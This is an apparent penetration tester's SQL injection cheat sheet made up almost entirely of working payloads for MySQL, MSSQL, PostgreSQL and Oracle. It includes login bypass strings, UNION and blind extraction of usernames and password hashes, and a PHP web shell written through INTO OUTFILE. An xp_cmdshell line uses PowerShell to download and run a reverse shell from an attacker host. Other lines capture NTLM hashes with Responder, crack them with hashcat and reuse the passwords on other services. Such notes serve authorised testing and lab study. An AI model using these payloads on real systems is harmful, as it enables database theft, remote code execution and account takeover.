# SQL injection

## Find it
Every parameter, cookie and header, one at a time:
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=1'"
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=1\""
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=2-1"
- [ ] An error names the database: your SQL syntax is MySQL, Unclosed quotation mark is MSSQL, unterminated quoted string is PostgreSQL, ORA- is Oracle
- [ ] 2-1 gives the same page as 1: a number that goes into the query unquoted
- [ ] In a URL, # is %23 and a space is + or %20; in Burp Repeater, Ctrl+U encodes a selection

## Confirm with true and false
From here on, each payload is the value of <Param>.
1 AND 1=1-- -
1 AND 1=2-- -
1' AND '1'='1
1' AND '1'='2
1' AND SLEEP(5)-- -
- [ ] The page changes between true and false: boolean; only the delay shows: time-based
- [ ] A string: every payload below starts with 1' in place of 1, or ' in place of -1

## A login form
admin'-- -
admin'#
' OR 1=1 LIMIT 1-- -
admin' OR '1'='1
") OR ("1"="1
- [ ] The app hashes the password before the query: inject in the username

## Union: columns
1 ORDER BY 1-- -
1 ORDER BY 2-- -
- [ ] Raised one at a time until it errors: the last that worked is the column count, three below
1 UNION SELECT NULL,NULL,NULL-- -
-1 UNION SELECT 1,2,3-- -
- [ ] The numbers that show on the page are the columns I read through: the second, below

## MySQL
-1 UNION SELECT NULL,CONCAT_WS(0x3a,@@version,user(),database()),NULL-- -
-1 UNION SELECT NULL,GROUP_CONCAT(schema_name),NULL FROM information_schema.schemata-- -
-1 UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema='<Database>'-- -
-1 UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='<Table>'-- -
-1 UNION SELECT NULL,GROUP_CONCAT(THE-USER-COLUMN,0x3a,THE-PASSWORD-COLUMN),NULL FROM <Database>.<Table>-- -
- [ ] GROUP_CONCAT stops at 1024 characters: LIMIT 0,1, then LIMIT 1,1, for long tables
Errors but no rows on the page, about 32 characters at a time:
1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- -
1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(GROUP_CONCAT(table_name),1,30) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -
Files, with the FILE privilege:
-1 UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL-- -
-1 UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -
curl -sk "<Scheme>://<WebHost>/shell.php?cmd=id"
- [ ] The write fails: secure_file_priv, or a web root MySQL cannot write; others are /var/www, C:/xampp/htdocs and C:/inetpub/wwwroot

## Blind
1' AND SUBSTRING(database(),1,1)='a'-- -
1' AND ASCII(SUBSTRING((SELECT THE-PASSWORD-COLUMN FROM <Table> LIMIT 1),1,1))>109-- -
1' AND IF(ASCII(SUBSTRING(database(),1,1))>109,SLEEP(5),0)-- -
- [ ] Every delay seen twice before I trust it: the network fakes them
- [ ] More than a few characters: sqlmap, :Pb sqlmap, where it is allowed

## MSSQL
-1 UNION SELECT NULL,@@version,NULL-- -
-1 UNION SELECT NULL,CONCAT(SYSTEM_USER,':',DB_NAME(),':',IS_SRVROLEMEMBER('sysadmin')),NULL-- -
-1 UNION SELECT NULL,STRING_AGG(name,','),NULL FROM master..sysdatabases-- -
-1 UNION SELECT NULL,STRING_AGG(name,','),NULL FROM <Database>..sysobjects WHERE xtype='U'-- -
-1 UNION SELECT NULL,STRING_AGG(name,','),NULL FROM <Database>..syscolumns WHERE id=OBJECT_ID('<Database>..<Table>')-- -
- [ ] STRING_AGG needs SQL Server 2017: before that, SELECT TOP 1 and NOT IN, one name at a time
Errors but no rows, one value each:
1' AND 1=CONVERT(int,@@version)-- -
1' AND 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM <Database>..sysobjects WHERE xtype='U'))-- -
Stacked queries as sysadmin, with sudo tcpdump -i tun0 icmp running on Kali:
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
'; EXEC xp_cmdshell 'ping -n 2 <LHOST>';-- -
'; EXEC xp_cmdshell 'powershell -c "iex (iwr -UseBasicParsing http://<LHOST>/rev.ps1)"';-- -
- [ ] rev.ps1 is a reverse shell from :Pb shells, served from Kali on port 80
Not sysadmin: the service account's NetNTLMv2 hash, with Responder listening.
sudo responder -I tun0
'; EXEC master..xp_dirtree '\\<LHOST>\share';-- -
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

## PostgreSQL
-1 UNION SELECT NULL,version(),NULL-- -
-1 UNION SELECT NULL,string_agg(table_name,','),NULL FROM information_schema.tables WHERE table_schema='public'-- -
-1 UNION SELECT NULL,string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='<Table>'-- -
1' AND 1=CAST((SELECT version()) AS int)-- -
1' AND 1=(SELECT 1 FROM pg_sleep(5))-- -

## Oracle
Every SELECT needs a FROM, and DUAL does when there is no table:
-1 UNION SELECT NULL,banner,NULL FROM v$version-- -
-1 UNION SELECT NULL,user,NULL FROM DUAL-- -
-1 UNION SELECT NULL,table_name,NULL FROM user_tables-- -
-1 UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='<Table>'-- -
-1 UNION SELECT NULL,THE-USER-COLUMN||':'||THE-PASSWORD-COLUMN,NULL FROM <Table>-- -
- [ ] Names in all_tab_columns are in capitals
- [ ] One row at a time: FROM (SELECT table_name, ROWNUM r FROM all_tables) WHERE r=1

## The hashes
hashcat hashes.txt /usr/share/wordlists/rockyou.txt
- [ ] hashcat cannot tell the type: -m 0 MD5, 100 SHA1, 300 MySQL, 3200 bcrypt
- [ ] Every password found tried on SSH, the app's admin login and every other service
